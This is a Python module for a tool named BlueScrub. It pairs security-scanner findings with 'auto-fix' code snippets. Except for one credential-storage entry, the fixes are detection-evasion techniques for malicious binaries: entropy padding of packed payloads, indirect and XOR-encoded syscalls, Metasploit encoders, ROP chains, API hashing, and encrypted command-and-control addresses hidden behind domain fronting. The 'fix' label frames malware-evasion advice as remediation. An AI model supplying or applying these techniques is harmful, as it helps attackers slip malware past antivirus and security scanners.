"""Auto-fix suggestions for BlueScrub findings."""

AUTO_FIX_SUGGESTIONS = {
    'High Entropy': {
        'code_fix': '''# Add padding with legitimate code patterns
# Before: packed_binary (entropy > 7.0)
# After: Add 20-30% low-entropy data

import random
def add_entropy_padding(data, target_entropy=6.5):
    """Add low-entropy padding to reduce overall entropy"""
    padding_size = len(data) // 3  # 33% padding
    # Use repeated patterns (low entropy)
    padding = b'\\x00' * (padding_size // 2) + b'AAAA' * (padding_size // 8)
    return data + padding''',
        'binary_fix': 'Add .rdata section with strings, embed legitimate PE resources, or use lower-entropy encoding',
        'tools': ['UPX with --best flag', 'Custom entropy normalizer', 'Resource embedding tools']
    },
    'syscall': {
        'code_fix': '''# Replace direct syscall with obfuscated version
; Instead of: syscall
; Use indirect syscall via ntdll.dll
mov r10, rcx
mov eax, <syscall_number>
call qword ptr [ntdll_syscall_stub]''',
        'binary_fix': 'Use indirect syscalls via ntdll stubs, or encrypt syscall bytes and decrypt at runtime',
        'tools': ['SysWhispers2', 'HellsGate', 'Custom syscall obfuscator']
    },
    'int 0x80': {
        'code_fix': '''# Obfuscate int 0x80 syscall
; XOR-encoded syscall stub
encoded_syscall: db 0x9d, 0xb0  ; 0xcd^0x50, 0x80^0x30
decode_and_call:
    xor byte [encoded_syscall], 0x50
    xor byte [encoded_syscall+1], 0x30
    jmp encoded_syscall''',
        'binary_fix': 'Encrypt syscall bytes, use polymorphic decoder, or switch to library calls',
        'tools': ['Metasploit encoders', 'Custom XOR encoder', 'Shikata-ga-nai']
    },
    'jmp esp': {
        'code_fix': '''# Avoid static jmp esp gadget
; Instead of direct jmp esp
mov eax, esp
add eax, 0      ; Can vary offset
jmp eax         ; Still detectable but different signature''',
        'binary_fix': 'Use ROP chains instead of direct gadgets, or use push/ret sequences',
        'tools': ['ROPgadget', 'ropper', 'Custom gadget generator']
    },
    'call eax': {
        'code_fix': '''# Obfuscate call eax
; Option 1: push/ret
push eax
ret
; Option 2: Indirect via stack
mov [rsp-8], rax
sub rsp, 8
ret''',
        'binary_fix': 'Replace with push/ret sequences or use vtable-style indirect calls',
        'tools': ['Binary patcher', 'Code cave injection']
    },
    'VirtualAlloc': {
        'code_fix': '''# Avoid direct VirtualAlloc import
PVOID pVirtualAlloc = NULL;
HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
pVirtualAlloc = (PVOID)GetProcAddress(hKernel32, "VirtualAlloc");
// Or use API hashing
pVirtualAlloc = GetProcByHash(0x91AFCA54);''',
        'binary_fix': 'Use GetProcAddress with obfuscated strings, API hashing, or direct syscalls',
        'tools': ['API Monitor', 'PE-bear for import analysis', 'Custom IAT obfuscator']
    },
    'dlsym': {
        'code_fix': '''# Obfuscate dlsym usage
char enc_name[] = {0x73^0x11, 0x6f^0x11, ...};  // Encrypted
char dec_name[32];
for(int i=0; i<len; i++) dec_name[i] = enc_name[i] ^ 0x11;
void* func = dlsym(handle, dec_name);
memset(dec_name, 0, sizeof(dec_name));  // Clear after use''',
        'binary_fix': 'Encrypt symbol names, use hash-based resolution, or statically link',
        'tools': ['String encryptor', 'Symbol obfuscator']
    },
    'Hardcoded IP': {
        'code_fix': '''# Remove hardcoded IPs
// XOR encrypted C2
unsigned char enc_c2[] = {0xc1^0xAA, 0xb9^0xAA, ...};
char c2[16];
for(int i=0; i<sizeof(enc_c2); i++) c2[i] = enc_c2[i] ^ 0xAA;
// Or use DNS/domain fronting
char* c2 = resolve_c2_via_dns("legit.cloudfront.net");''',
        'binary_fix': 'Encrypt C2 addresses, use domain fronting, or retrieve from external source',
        'tools': ['String encryptor', 'Domain fronting setup']
    },
    'Hardcoded Password': {
        'code_fix': '''# Remove hardcoded credentials
import os
from cryptography.fernet import Fernet
# Option 1: Environment variable
password = os.environ.get('APP_SECRET')
# Option 2: Encrypted config file
key = derive_key_from_machine_id()
password = Fernet(key).decrypt(encrypted_password)''',
        'binary_fix': 'Use key derivation from machine-specific data, or external secure storage',
        'tools': ['Vault', 'AWS Secrets Manager', 'Azure Key Vault']
    },
}


def get_auto_fix(issue_text):
    """Get auto-fix suggestion for an issue."""
    issue_lower = issue_text.lower()
    for keyword, fix in AUTO_FIX_SUGGESTIONS.items():
        if keyword.lower() in issue_lower:
            return fix
    return None


def enrich_issues_with_fixes(issues):
    """Add auto-fix suggestions to issues list."""
    enriched = []
    for issue in issues:
        enriched_issue = issue.copy()
        desc = issue.get('description', '') + ' ' + issue.get('type', '')
        fix = get_auto_fix(desc)
        if fix:
            enriched_issue['auto_fix'] = fix
        enriched.append(enriched_issue)
    return enriched

